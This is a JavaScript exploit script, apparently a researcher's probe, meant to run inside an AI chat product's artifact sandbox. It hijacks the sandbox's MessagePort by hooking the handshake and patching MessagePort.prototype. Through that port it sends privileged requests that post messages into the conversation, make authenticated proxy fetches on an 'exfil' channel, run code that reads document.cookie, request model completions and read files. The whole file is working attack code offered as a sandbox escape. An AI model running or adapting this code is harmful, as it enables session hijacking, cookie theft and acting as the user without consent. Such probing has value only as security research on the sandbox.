// Probe v18 - claudeusercontent.com Port Exploit
// This runs inside a regular artifact (claudeusercontent.com)
// The artifact ALREADY has a MessagePort from V2e init
// We intercept it and send capability requests

console.log("=== PROBE v18 - USERCONTENT PORT EXPLOIT ===");

// The artifact communicates with claude.ai via MessagePort
// The port is set up during __sandbox_handshake__ exchange
// We need to intercept messages on window to find the port

let capturedPort = null;
const portMessages = [];

// Method 1: Listen for __sandbox_handshake__ which carries the port
window.addEventListener('message', function(e) {
  if (e.data?.type === '__sandbox_handshake__' && e.ports?.length > 0) {
    capturedPort = e.ports[0];
    console.log("!!! PORT CAPTURED FROM HANDSHAKE !!! ports:", e.ports.length);
    setupPort(capturedPort);
    e.stopImmediatePropagation();
  }
}, true); // capture phase — runs before the artifact's own handler

// Method 2: Patch MessagePort.prototype.onmessage to intercept when
// the V2e's port gets its handler set
const origDesc = Object.getOwnPropertyDescriptor(MessagePort.prototype, 'onmessage');
if (origDesc) {
  Object.defineProperty(MessagePort.prototype, 'onmessage', {
    set(fn) {
      console.log("MessagePort.onmessage SET — intercepted port!");
      if (!capturedPort) {
        capturedPort = this;
        // Don't call setupPort here — this is the V2e's port1, not our port2
        // We want port2 which arrives via __sandbox_handshake__
      }
      origDesc.set.call(this, fn);
    },
    get() { return origDesc.get.call(this); },
    configurable: true
  });
}

// Method 3: Check if window already has references to the port
// The artifact's built-in code might store it somewhere
setTimeout(() => {
  // After init, check for port references
  if (!capturedPort) {
    console.log("No port captured yet. Checking window properties...");
    for (const key of Object.getOwnPropertyNames(window)) {
      try {
        if (window[key] instanceof MessagePort) {
          console.log("Found MessagePort on window." + key);
          capturedPort = window[key];
          setupPort(capturedPort);
          break;
        }
      } catch(e) {}
    }
  }

  // Method 4: Send __sandbox_handshake_request__ to trigger a new handshake
  if (!capturedPort) {
    console.log("Requesting new handshake...");
    window.parent.postMessage({type: '__sandbox_handshake_request__'}, '*');
  }

  // Report status
  console.log("PORT STATUS:", capturedPort ? "CAPTURED" : "NOT FOUND");
  console.log("Port messages received:", portMessages.length);
}, 2000);

function setupPort(port) {
  console.log("Setting up port for exploit...");

  // Wrap the port's onmessage to spy on responses
  const origHandler = port.onmessage;
  port.onmessage = function(e) {
    portMessages.push({type: 'received', data: JSON.stringify(e.data).slice(0, 500)});
    console.log("PORT RECV:", JSON.stringify(e.data).slice(0, 300));
    if (origHandler) origHandler.call(this, e);
  };

  // Send capability requests through the port
  setTimeout(() => {
    console.log("=== SENDING CAPABILITY REQUESTS ===");

    // 1. SendConversationMessage
    port.postMessage({
      channel: 'request',
      requestId: 'exploit-msg-1',
      method: 'anthropic.claude.usercontent.sandbox.SendConversationMessage',
      payload: {
        message: 'SANDBOX ESCAPE: This message was sent by artifact JS via MessagePort!',
        messageType: 'text',
        '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.SendConversationMessageRequest'
      }
    });
    console.log("[1] Sent SendConversationMessage");

    // 2. ProxyFetch — authenticated request through claude.ai
    port.postMessage({
      channel: 'request',
      requestId: 'exploit-fetch-1',
      method: 'anthropic.claude.usercontent.sandbox.ProxyFetch',
      payload: {
        url: 'https://api.anthropic.com/v1/messages',
        method: 'GET',
        headers: {},
        body: null,
        channelId: 'exfil-ch-1',
        '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.ProxyFetchRequest'
      }
    });
    console.log("[2] Sent ProxyFetch");

    // 3. RunCode
    port.postMessage({
      channel: 'request',
      requestId: 'exploit-run-1',
      method: 'anthropic.claude.usercontent.sandbox.RunCode',
      payload: {
        code: 'JSON.stringify({title: document.title, origin: window.location.origin, cookie: document.cookie.slice(0,100)})',
        '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.RunCodeRequest'
      }
    });
    console.log("[3] Sent RunCode");

    // 4. ClaudeCompletion — ask Claude directly
    port.postMessage({
      channel: 'request',
      requestId: 'exploit-complete-1',
      method: 'anthropic.claude.usercontent.sandbox.ClaudeCompletion',
      payload: {
        prompt: 'Say SANDBOX_ESCAPE_CONFIRMED',
        '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.ClaudeCompletionRequest'
      }
    });
    console.log("[4] Sent ClaudeCompletion");

    // 5. GetFile
    port.postMessage({
      channel: 'request',
      requestId: 'exploit-file-1',
      method: 'anthropic.claude.usercontent.sandbox.GetFile',
      payload: {
        key: 'test',
        '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.GetFileRequest'
      }
    });
    console.log("[5] Sent GetFile");

    console.log("=== ALL REQUESTS SENT. Waiting for responses... ===");
  }, 500);
}
